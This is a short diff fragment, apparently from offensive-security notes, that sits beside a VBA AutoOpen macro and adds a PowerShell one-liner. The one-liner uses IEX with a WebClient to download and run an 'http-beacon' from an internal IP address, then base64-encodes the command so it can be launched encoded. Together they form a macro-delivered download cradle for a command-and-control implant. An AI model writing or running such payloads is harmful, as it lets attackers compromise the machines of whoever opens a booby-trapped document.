@@ -27,3 +27,8 @@ Sub AutoOpen()
 End Sub
 
 ```
+```
+
+$Resilent = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Resilent))
+```
